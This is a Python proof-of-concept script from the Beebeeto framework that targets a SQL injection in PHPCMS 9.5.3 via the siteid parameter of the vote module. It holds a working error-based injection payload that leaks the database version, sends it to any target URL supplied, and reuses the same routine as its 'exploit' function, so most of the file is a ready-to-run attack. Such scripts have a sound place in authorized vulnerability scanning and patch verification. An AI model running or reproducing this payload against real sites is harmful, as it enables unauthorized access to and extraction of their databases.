#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0113',
            'name': 'PHPCMS 9.5.3 /phpcms/modules/vote/classes/vote_tag.class.php SQL注入漏洞 POC',
            'author': '1024',
            'create_date': '2014-10-25',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPCMS',
            'vul_version': ['9.5.3'],
            'type': 'SQL Injection',
            'tag': ['PHPCMS漏洞', 'SQL注入漏洞', '/vote_tag.class.php', 'php'],
            'desc': '''
                    vote_tag.class.php 文件siteid变量通过全局来接受，那么在php.ini中的register_globals=On的情况下，
                    siteid就变为可控的变量，之后再拼接成$sql变量时也没有进行任何过滤，带入数据库查询就直接导致了SQL注入漏洞。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-051077',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/index.php?m=vote&c=index&siteid=1'%20and%20(select%201%20from%20%20(select%20count(*),"
                   "concat(version(),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a);%23")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        reg = re.compile("Duplicate entry '(.*?)' for key 'group_key'")
        res = reg.findall(content)
        if res:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())